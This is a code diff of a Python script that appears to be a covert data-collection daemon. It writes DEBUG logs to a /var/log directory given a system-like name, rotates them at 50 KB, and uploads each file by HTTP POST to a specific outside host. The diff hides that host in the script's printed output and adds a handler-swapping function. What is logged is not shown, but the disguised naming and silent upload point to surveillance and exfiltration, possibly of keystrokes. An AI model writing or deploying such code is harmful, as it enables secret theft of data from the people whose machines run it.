@@ -7,9 +7,9 @@ import requests
 import os
 
 # === Configuration ===
-MAX_SIZE = 100 * 1024
-SERVER_URL = "https://REMOTE_SERVER/upload"
-LOG_DIR = Path("/var/log/SYSTEM_DATA")
+MAX_SIZE = 50 * 1024
+SERVER_URL = "https://files-sgn.jameskaois.com/upload"
+LOG_DIR = Path("/var/log/system")
 ACTIVE_FILE = LOG_DIR / "daemon_current.txt"
 
 # === Helper functions ===
@@ -45,7 +45,7 @@ def upload_and_reset(file_path):
     try:
         with open(file_path, "rb") as f:
             files = {"file": f}
-            print(f"[+] Uploading {file_path} → {SERVER_URL}")
+            print(f"[+] Uploading {file_path} → Remote Server")
             requests.post(SERVER_URL, files=files, timeout=5)
     except Exception as e:
         print(f"[!] Upload failed: {e}")
@@ -59,7 +59,9 @@ def upload_and_reset(file_path):
 
     new_path = current_logfile()
     ACTIVE_FILE.write_text(str(new_path))
-    setup_logging(new_path)
+    with open(new_path, 'w') as file:
+      print(f"[+] Created {file_path}")
+    change_log_file(new_path)
     return new_path
 
 def setup_logging(logfile_path):
@@ -69,6 +71,33 @@ def setup_logging(logfile_path):
         level=logging.DEBUG,
         format="%(asctime)s: %(message)s"
     )
+
+def change_log_file(new_logfile_path):
+  """
+  Finds the existing FileHandler, removes it, and adds a new one.
+  """
+  logger = logging.getLogger()
+  
+  old_handler = None
+  for handler in logger.handlers:
+      if isinstance(handler, logging.FileHandler):
+          old_handler = handler
+          break
+
+  if old_handler:
+      formatter = old_handler.formatter
+    
+      old_handler.close()
+      logger.removeHandler(old_handler)
+
+      new_handler = logging.FileHandler(str(new_logfile_path))
+      new_handler.setFormatter(formatter) # Apply the same format
+      logger.addHandler(new_handler)
+      
+      print(f"[+] Logging path changed to: {new_logfile_path}")
+  else:
+      print("[!] No FileHandler found to replace.")
+
 
 # === Main logic ===
 logfile = get_active_logfile()
